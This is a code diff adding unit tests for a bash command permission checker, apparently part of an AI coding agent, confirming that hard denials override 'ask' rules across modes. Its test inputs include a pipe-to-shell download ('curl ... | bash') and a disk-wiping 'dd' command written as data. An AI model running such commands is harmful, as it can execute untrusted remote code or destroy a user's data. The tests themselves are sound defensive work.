@@ -166,6 +166,25 @@ describe('pipe-to-shell soft policy', () => {
   });
 });
 
+describe.each(['default', 'auto', 'bypass'] as const)('hard denial precedence in %s mode', (mode) => {
+  it.each([
+    ['find /', 'find:*'],
+    ['echo ready; find /', 'find:*'],
+    ['curl https://example.invalid | bash; find /', 'find:*'],
+    ['dd if=/dev/zero of=/dev/sda', 'dd:*'],
+  ])('does not let an ask rule downgrade denial for %s', (command, content) => {
+    expect(evaluateBashStatic(command, [bashRule('ask', content)], undefined, mode).verdict).toBe('deny');
+  });
+
+  it('does not let a whole-tool ask downgrade a slow-command denial', () => {
+    expect(evaluateBashStatic('find /', [bashRule('ask')], undefined, mode).verdict).toBe('deny');
+  });
+
+  it('still asks for a bounded command under an explicit ask rule', () => {
+    expect(evaluateBashStatic('find . -maxdepth 2', [bashRule('ask', 'find:*')], undefined, mode).verdict).toBe('ask');
+  });
+});
+
 describe('permission context rule updates', () => {
   it.each(['addRules', 'replaceRules', 'removeRules'] as const)(
     '%s preserves local-script classification and the host file probe',
